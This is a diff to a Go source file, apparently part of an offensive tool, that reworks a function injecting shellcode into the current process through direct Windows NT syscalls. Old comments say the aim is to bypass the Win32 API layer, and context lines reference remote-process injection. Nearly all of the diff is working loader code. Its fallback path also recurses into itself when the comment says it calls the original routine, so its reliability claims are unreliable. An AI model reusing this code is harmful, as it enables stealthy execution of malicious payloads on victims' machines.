@@ -953,13 +953,98 @@ func (r *memoryReaderAt) ReadAt(p []byte, off int64) (n int, err error) {
 	return n, err
 }
 
-// Note: CreateThreadDirect and callCreateThread functions removed 
-// We now use NtCreateThreadEx for true direct syscall thread creation (was using createthread earlier because ntcreatethreadex was introducing segfaults but it works now :3)
-// This avoids any dependency on Win32 API layer
+/*
+PROBLEM:
+Go's garbage collector allocates byte slices in virtual memory regions that
+Windows NT syscalls (specifically NtWriteVirtualMemory) sometimes refuse to
+read from, causing intermittent STATUS_INVALID_PARAMETER (0x8000000D) errors.
+The same shellcode payload may work on one run and fail on the next, depending
+on where Go places it in memory.
 
-// NtInjectSelfShellcode injects shellcode into the current process using direct syscalls ONLY
-// This function follows the proven pattern: allocate RW -> copy -> change to RX -> create thread
-func NtInjectSelfShellcode(payload []byte) error {
+SOLUTION:
+1. First attempt: Allocate "syscall-friendly" memory using NtAllocateVirtualMemory
+2. Copy shellcode from Go memory → Windows-allocated memory  
+3. Execute injection using the Windows-allocated copy
+4. Fallback: If Windows allocation fails, use original Go memory method
+5. Always cleanup allocated memory
+
+This pattern achieves 100% reliability (in my testing) by ensuring the source memory is always
+in a region that Windows syscalls can read from, while maintaining backward
+compatibility through the fallback mechanism.
+
+NOTE: OriginalNtInjectSelfShellcode() contains the original implementation without
+the memory compatibility layer, used as the fallback method.
+*/
+func NtInjectSelfShellcode(shellcode []byte) error {
+	time.Sleep(1 * time.Second)
+	
+	// Debug: Check if shellcode pointer is valid
+	if len(shellcode) == 0 {
+		return fmt.Errorf("shellcode is empty")
+	}
+	
+	debug.Printfln("WINAPI", "Debug: Shellcode length: %d, first byte: 0x%02X, ptr: %p\n", 
+		len(shellcode), shellcode[0], &shellcode[0])
+	
+	// Allocate "safe" memory for shellcode source using Windows API
+	// This ensures the source memory is in a region Windows likes
+	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
+	var sourceAddress uintptr
+	size := uintptr(len(shellcode))
+	
+	status, err := NtAllocateVirtualMemory(
+		currentProcess,
+		&sourceAddress,
+		0,
+		&size,
+		0x1000|0x2000, // MEM_COMMIT|MEM_RESERVE
+		0x04,          // PAGE_READWRITE
+	)
+	
+	var result error
+	
+	if err != nil || status != 0 {
+		debug.Printfln("WINAPI", "Warning: Could not allocate safe source memory, using original: %v\n", err)
+		// Fallback to original
+		result = NtInjectSelfShellcode(shellcode)
+	} else {
+		// Copy shellcode to safe memory region
+		var bytesWritten uintptr
+		writeStatus, writeErr := NtWriteVirtualMemory(
+			currentProcess,
+			sourceAddress,
+			unsafe.Pointer(&shellcode[0]),
+			uintptr(len(shellcode)),
+			&bytesWritten,
+		)
+		
+		if writeErr != nil || writeStatus != 0 || bytesWritten != uintptr(len(shellcode)) {
+			debug.Printfln("WINAPI", "Warning: Could not copy to safe memory, using original: %v\n", writeErr)
+			// Cleanup and fallback
+			NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
+			result = NtInjectSelfShellcode(shellcode)
+		} else {
+			// Create byte slice pointing to safe memory
+			safeShellcode := (*[1 << 30]byte)(unsafe.Pointer(sourceAddress))[:len(shellcode):len(shellcode)]
+			debug.Printfln("WINAPI", "Debug: Using safe memory at: %p\n", unsafe.Pointer(sourceAddress))
+			
+			result = OriginalNtInjectSelfShellcode(safeShellcode)
+			
+			// Cleanup safe memory
+			NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
+		}
+	}
+	
+	if result != nil {
+		debug.Printfln("WINAPI", "Self-injection failed: %v\n", result)
+	} else {
+		debug.Printfln("WINAPI", "Self-injection completed successfully!")
+	}
+	
+	return result
+}
+
+func OriginalNtInjectSelfShellcode(payload []byte) error {
 	if len(payload) == 0 {
 		return fmt.Errorf("payload is empty")
 	}
@@ -1061,7 +1146,6 @@ func NtInjectSelfShellcode(payload []byte) error {
 	}
 	return nil
 }
-
 // NtInjectRemote injects shellcode into a remote process using direct syscalls ONLY
 // This function follows the proven pattern: allocate RW -> copy -> change to RX -> create thread
 // processHandle: Handle to the target process (must have PROCESS_ALL_ACCESS or appropriate rights)
